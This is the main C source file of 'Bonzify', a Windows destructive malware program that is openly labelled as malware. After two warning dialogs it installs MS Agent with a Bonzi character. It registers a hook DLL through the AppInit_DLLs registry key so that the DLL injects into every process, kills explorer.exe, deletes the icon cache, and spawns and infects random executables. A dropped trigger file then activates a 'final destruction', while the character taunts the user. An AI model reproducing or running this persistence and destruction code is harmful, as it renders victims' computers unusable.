#include <Windows.h>
#include <ShlObj.h>

#include "Bonzi.h"
#include "Utils.h"
#include "resource.h"

static void RunInstallerResource(int resid, LPCTSTR path);
DWORD WINAPI findEXEsThread(LPVOID parameter);

//#define Sleep(x) void();

void main() {
	if (MessageBoxA(NULL, "The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", "Bonzify", MB_YESNO | MB_ICONWARNING) != IDYES ||
MessageBoxA(NULL, "THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", "Bonzify", MB_YESNO | MB_ICONHAND) != IDYES) {
		ExitProcess(0);
	}
	
	// Search for EXEs
	CreateThread(NULL, NULL, findEXEsThread, NULL, 0, NULL);

	// Delete existing MS Agent
	LPTSTR KillAgentPath = ExpandPath(TEXT("%TEMP%\\KillAgent.bat"));
	SaveResourceNormal(IDR_KILLAGENT, KillAgentPath);
	RunFileWaitSimple(KillAgentPath);

	// Extract Take Ownership Script
	// TODO Take the Ownership using C code, not using a shitty batch file
	SaveResourceNormal(IDR_TAKEOWN, ExpandPath(TEXT("%TEMP%\\TakeOwn.bat")));

	// Install MS Agent
	RunInstallerResource(IDR_AGENTINSTALLER, TEXT("%TEMP%\\MSAGENT.EXE"));

	// Install L&H TruVoice
	RunInstallerResource(IDR_TRUVOICEINSTALLER, TEXT("%TEMP%\\tv_enua.EXE"));

	// Install Bonzi Character
	LPCTSTR characterPath = TEXT("%SYSTEMROOT%\\msagent\\chars\\Bonzi.acs");
	SaveResourceNormal(IDR_BONZICHAR, characterPath);

	// Sleep to make sure everything is installed
	Sleep(1000);

	// Load Bonzi
	Bonzi_Init();

	Bonzi_Speak(L"Hello, I'm Bonzi.");
	Bonzi_Speak(L"I'm here to destroy your computer again. But this time, it's an actual destruction.");
	Bonzi_Speak(L"The first thing I'll do is to inject my beauty into all programs that start from now.");

	Sleep(15000);

	// Extract Hook DLL
	LPTSTR hookDLLPath = ExpandPath(TEXT("%SYSTEMDRIVE%\\HookDLL.dll"));
	SaveResourceNormal(IDR_HOOKDLL, hookDLLPath);

	// Install Hook DLL
	HKEY key;
	RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows"), &key);

	RegSetValueEx(key, TEXT("AppInit_DLLs"), 0, REG_SZ, (BYTE*)hookDLLPath, (lstrlen(hookDLLPath) + 1) * sizeof(TCHAR));

	DWORD x = 1;
	RegSetValueEx(key, TEXT("LoadAppInit_DLLs"), 0, REG_DWORD, (BYTE*)&x, sizeof(x));

	RegCloseKey(key);

	// Reload Icons
	SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL);
	SendMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0);

	// Kill explorer.exe
	KillProcessByName(TEXT("explorer.exe"));

	// Delete the icon cache
	// TODO Implement this for XP too
	LPTSTR iconCachePath = ExpandPath(TEXT("%LOCALAPPDATA%\\IconCache.db"));
	DeleteFile(iconCachePath);

	// Restart explorer.exe
	//RunFileSimple(TEXT("%SYSTEMROOT%\\explorer.exe"));
	RunFileSimple(TEXT("explorer.exe"));

	// Reload Icons again
	SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL);
	SendMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0);

	Sleep(2000);

	Bonzi_Speak(L"Doesn't it look great?");

	Bonzi_Speak(L"I would not recommend to restart your system from now, because it might be a bit unstable...");

	Bonzi_Speak(L"If you wait a bit for me, I will do even more than just that.");
	Bonzi_Speak(L"I will spam your computer with random executables, inject my code into them too and let them corrupt your computer.");
	Bonzi_Speak(L"Your programs are my slaves from then, doesn't that sound great?");

	Sleep(23000);
	Bonzi_Speak(L"You've got 30 seconds left until I activate the final destruction.");
	Bonzi_Speak(L"You should look around your system, because now I'm everywhere.");
	Sleep(10000);
	Bonzi_Speak(L"You've got 20 seconds left until I activate the final destruction.");
	Sleep(10000);
	Bonzi_Speak(L"You've got 10 seconds left until I activate the final destruction.");
	Sleep(10000);

	// Write a file to tell the hooked processes to begin the destruction
	DWORD number = 0xdeaddead;
	SaveBufferHidden(TEXT("%SYSTEMROOT%\\finalDestruction.bin"), &number, sizeof(number));

	Bonzi_Speak(L"Destruction of Death is now activated.");
	Bonzi_Speak(L"My work is now done. Goodbye, Expand Dong.");
	Bonzi_Speak(L"Just sit back and enjoy.");
	Sleep(15000);

	// TODO Use actual MS Agent functions
	// Let Bonzi disappear
	KillProcessByName(TEXT("agentsvr.exe"));

	//ExitProcess(0);

	// Main Loop
	for (;;) {
		Sleep(100000);
	}
}

static void RunInstallerResource(int resid, LPCTSTR path) {
	// TODO Find a better implementation that does not need to run this twice
	LPTSTR newPath = ExpandPath(TEXT("%TEMP%\\INSTALLER.exe"));

	LPTSTR cmdLine = (LPTSTR)MemeAlloc(2048);
	lstrcpy(cmdLine, TEXT("INSTALLER.exe /q"));

	// TODO Fix the Args directly in utils
	SaveResourceNormal(resid, newPath);
	RunFileWaitWithArgs(newPath, cmdLine);

	DeleteFile(newPath);
	MemeFree(newPath);
	MemeFree(cmdLine);
}